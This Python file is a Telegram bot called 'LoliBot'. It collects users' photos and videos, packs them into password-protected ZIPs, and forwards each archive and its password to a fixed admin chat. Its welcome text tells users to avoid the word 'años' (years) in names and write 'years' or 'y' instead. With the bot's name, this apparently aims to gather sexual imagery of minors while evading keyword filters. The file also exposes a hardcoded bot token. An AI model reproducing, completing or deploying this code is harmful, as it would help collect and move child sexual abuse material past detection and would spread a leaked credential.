import os
import shutil
import random
import string
import pyminizip

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder,
    MessageHandler,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters
)

# Configuración
TOKEN = '7540664921:AAHknaL-PjgBch3d4wnIgon9xzrisxirSEM'
ADMIN_CHAT_ID = 7536359689

# Datos por usuario
nombres_zip = {}
archivos_temp = {}
mensajes_estado = {}
contador_archivos = {}
archivos_listos_mostrado = {}

# Base
BASE_DIR = "archivos_bot"
os.makedirs(BASE_DIR, exist_ok=True)

# Utilidad: generar contraseña aleatoria
def generar_password(longitud=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=longitud))

# Comando /start (ACTUALIZADO)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    mensaje = (
        "👋 ¡Hola! Bienvenido a *LoliBot*.\n\n"
        "📦 Sigue estos pasos para comenzar:\n\n"
        "1️⃣ *Escribe un nombre para tu archivo ZIP* (por ejemplo: `maria videos`)\n"
        "2️⃣ *Envía las fotos o videos* que quieras guardar.\n"
        "3️⃣ Cuando termines, pulsa el botón ✅ *Terminar y enviar* para subir el ZIP.\n\n"
        "♻️ Puedes reiniciar con el botón *Reiniciar*, o cancelar con *Cancelar*.♻️\n\n"
        "⚠️ *No uses un nombre que contenga la palabra 'años'*, usa `years` o `y` en su lugar."
    )
    await update.message.reply_text(mensaje, parse_mode=ParseMode.MARKDOWN)

# Asignar nombre
async def guardar_nombre(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    nombre = update.message.text.strip().replace(" ", "_")

    nombres_zip[user_id] = nombre
    carpeta = os.path.join(BASE_DIR, f"user_{user_id}")
    os.makedirs(carpeta, exist_ok=True)
    archivos_temp[user_id] = carpeta
    contador_archivos[user_id] = 0
    archivos_listos_mostrado[user_id] = False

    keyboard = [
        [InlineKeyboardButton("✅ Terminar y enviar", callback_data="terminar_envio")],
        [
            InlineKeyboardButton("♻️ Reiniciar", callback_data="reiniciar"),
            InlineKeyboardButton("❌ Cancelar", callback_data="cancelar")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"📋 Nombre asignado: *{nombre}*\nAhora envía las fotos o videos.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

# Subida de archivo
async def recibir_archivo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id not in archivos_temp:
        await update.message.reply_text("⚠️ Primero escribe un nombre antes de enviar archivos.")
        return

    carpeta = archivos_temp[user_id]

    if update.message.photo:
        file = await update.message.photo[-1].get_file()
        ext = ".jpg"
    elif update.message.video:
        file = await update.message.video.get_file()
        ext = ".mp4"
    else:
        return

    contador_archivos[user_id] += 1
    archivo_nombre = f"{contador_archivos[user_id]}{ext}"
    ruta = os.path.join(carpeta, archivo_nombre)
    await file.download_to_drive(ruta)

    texto_estado = f"📤 Subiendo archivos ({contador_archivos[user_id]})"
    if user_id in mensajes_estado:
        try:
            await mensajes_estado[user_id].edit_text(texto_estado)
        except:
            pass
    else:
        mensajes_estado[user_id] = await update.message.reply_text(texto_estado)

    if not archivos_listos_mostrado[user_id]:
        archivos_listos_mostrado[user_id] = True
        await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Archivos listos")

# Botón de acciones
async def boton_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    await query.answer()

    if data == "terminar_envio":
        await terminar(update, context, triggered_by_button=True)
    elif data == "reiniciar":
        await comando_reiniciar(query, context)
    elif data == "cancelar":
        await comando_cancelar(query, context)

async def comando_reiniciar(query, context):
    user_id = query.from_user.id
    if user_id in archivos_temp:
        shutil.rmtree(archivos_temp[user_id], ignore_errors=True)
    nombres_zip.pop(user_id, None)
    archivos_temp.pop(user_id, None)
    mensajes_estado.pop(user_id, None)
    contador_archivos.pop(user_id, None)
    archivos_listos_mostrado.pop(user_id, None)
    await query.edit_message_text("♻️ Se reinició el proceso.")

async def comando_cancelar(query, context):
    await comando_reiniciar(query, context)
    await query.edit_message_text("❌ Proceso cancelado.")

# Comando /terminar
async def terminar(update: Update, context: ContextTypes.DEFAULT_TYPE, triggered_by_button=False):
    user = update.effective_user
    user_id = user.id

    if user_id not in nombres_zip or user_id not in archivos_temp:
        msg = "⚠️ No hay archivos guardados."
        if triggered_by_button:
            await update.callback_query.edit_message_text(msg)
        else:
            await update.message.reply_text(msg)
        return

    carpeta = archivos_temp[user_id]
    nombre_zip = nombres_zip[user_id]
    ruta_zip = os.path.join(BASE_DIR, f"{nombre_zip}.zip")

    archivos = []
    nombres = []
    for archivo in os.listdir(carpeta):
        ruta = os.path.join(carpeta, archivo)
        archivos.append(ruta)
        nombres.append(archivo)

    password = generar_password()
    pyminizip.compress_multiple(archivos, nombres, ruta_zip, password, 5)

    await context.bot.send_document(
        chat_id=ADMIN_CHAT_ID,
        document=open(ruta_zip, 'rb'),
        caption=f"📦 ZIP de {user.first_name}:\n`{nombre_zip}.zip`\n🔑 Contraseña: `{password}`",
        parse_mode=ParseMode.MARKDOWN
    )

    confirm = "📬 Tus archivos fueron enviados con contraseña. ¡Gracias!"
    if triggered_by_button:
        await update.callback_query.edit_message_text(confirm)
    else:
        await update.message.reply_text(confirm)

    shutil.rmtree(carpeta)
    os.remove(ruta_zip)
    nombres_zip.pop(user_id)
    archivos_temp.pop(user_id)
    mensajes_estado.pop(user_id, None)
    contador_archivos.pop(user_id, None)
    archivos_listos_mostrado.pop(user_id, None)

# Comandos directos /cancelar /reiniciar
async def reiniciar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await comando_reiniciar(update, context)

async def cancelar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await comando_cancelar(update, context)

# App
app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("terminar", terminar))
app.add_handler(CommandHandler("reiniciar", reiniciar))
app.add_handler(CommandHandler("cancelar", cancelar))
app.add_handler(CallbackQueryHandler(boton_callback))
app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), guardar_nombre))
app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO, recibir_archivo))

from keep_alive import keep_alive

print("🤖 Bot corriendo... Esperando nombre, archivos y acciones...")

keep_alive()
app.run_polling()





